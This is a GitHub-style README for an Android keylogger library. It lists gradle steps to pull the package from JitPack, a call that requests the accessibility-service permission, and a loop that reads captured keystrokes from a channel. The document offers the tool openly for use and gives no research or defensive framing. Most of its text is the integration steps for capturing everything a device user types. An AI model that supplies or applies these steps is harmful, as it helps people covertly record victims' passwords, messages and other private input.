# Android Keylogger
### A keylogger library for Android allowing for better logging of keystrokes by ridding yourself of the unnecessary overhead of threads.
1. Add the JitPack repository to your project's build.gradle
```gradle
allprojects {
	repositories {
		...
		maven { url 'https://jitpack.io' }
	}
}
```
2. Add the dependency to your app's build.gradle
```gradle
dependencies {
        implementation 'com.github.evilthreads669966:android_keylogger:1.0'
}
```
3. Request the accessibility service permission for your app.
```kotlin
Keylogger.requestPermission(this)
```
4. Receive on the keylogger channel
```kotlin
for(entry in Keylogger.channel){
    //do something with keystrokes
}
```
## License
```
Copyright 2020 Chris Basinger

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
limitations under the License.
```
